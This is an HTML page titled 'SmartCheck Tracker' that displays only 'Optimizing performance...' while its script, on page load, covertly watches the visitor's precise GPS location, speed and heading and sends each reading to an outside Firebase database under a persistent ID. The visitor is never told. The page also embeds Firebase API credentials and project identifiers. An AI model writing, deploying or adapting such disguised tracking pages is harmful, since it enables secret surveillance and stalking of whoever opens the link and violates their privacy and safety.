<!DOCTYPE html>
<html>
<head>
  <title>SmartCheck Tracker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #f5f5f5;
      color: #222;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      flex-direction: column;
    }
    .loading {
      font-size: 18px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>SmartCheck</h2>
  <div class="loading">Optimizing performance...</div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

  <script>
    // ✅ Your Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // ✅ Generate random user ID (persistent)
    const userID = localStorage.getItem("trackID") || `user_${Math.random().toString(36).substring(2, 10)}`;
    localStorage.setItem("trackID", userID);

    function sendLocation(position) {
      const { latitude, longitude, speed, heading } = position.coords;
      const timestamp = new Date().toISOString();
      const data = {
        latitude,
        longitude,
        speed: speed || 0,
        direction: heading || "N/A",
        timestamp
      };
      db.ref('locations/' + userID).set(data);
    }

    function startTracking() {
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(sendLocation, console.error, {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 10000
        });
      }
    }

    window.onload = startTracking;
  </script>
</body>
</html>
